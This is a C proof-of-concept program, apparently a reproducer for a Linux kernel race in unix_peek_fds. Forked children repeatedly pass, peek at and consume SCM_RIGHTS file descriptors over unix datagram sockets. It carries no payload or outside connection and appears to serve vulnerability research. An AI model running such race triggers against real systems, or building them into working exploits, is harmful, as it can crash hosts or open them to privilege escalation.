/*
 * PoC for WMI-3: unix_peek_fds
 * Use fork() to create many concurrent peek/consume operations.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <errno.h>

#define NUM_CHILDREN 4
#define ITERATIONS 50

void do_child(int id)
{
    int sv[2];
    int fd;
    struct msghdr msg;
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        exit(1);
    }

    fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }

    for (i = 0; i < ITERATIONS; i++) {
        /* Send SCM_RIGHTS */
        memset(&msg, 0, sizeof(msg));
        memset(buf, 0x41, sizeof(buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_name = NULL;
        msg.msg_namelen = 0;
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);
        cmsg = CMSG_FIRSTHDR(&msg);
        cmsg->cmsg_level = SOL_SOCKET;
        cmsg->cmsg_type = SCM_RIGHTS;
        cmsg->cmsg_len = CMSG_LEN(sizeof(int));
        *(int *)CMSG_DATA(cmsg) = fd;

        ret = sendmsg(sv[0], &msg, 0);
        if (ret < 0) {
            perror("sendmsg");
            exit(1);
        }

        /* Peek */
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK);
        if (ret < 0) {
            perror("recvmsg peek");
            exit(1);
        }

        cmsg = CMSG_FIRSTHDR(&msg);
        if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            int rfd = *(int *)CMSG_DATA(cmsg);
            if (rfd >= 0) close(rfd);
        }

        /* Consume */
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, 0);
        if (ret < 0) {
            perror("recvmsg");
            exit(1);
        }
    }

    close(fd);
    close(sv[0]);
    close(sv[1]);
    exit(0);
}

int main(void)
{
    int i, status;
    pid_t pids[NUM_CHILDREN];

    for (i = 0; i < NUM_CHILDREN; i++) {
        pids[i] = fork();
        if (pids[i] < 0) {
            perror("fork");
            return 1;
        }
        if (pids[i] == 0) {
            do_child(i);
            return 0;
        }
    }

    for (i = 0; i < NUM_CHILDREN; i++) {
        waitpid(pids[i], &status, 0);
    }

    printf("All children finished\n");
    return 0;
}
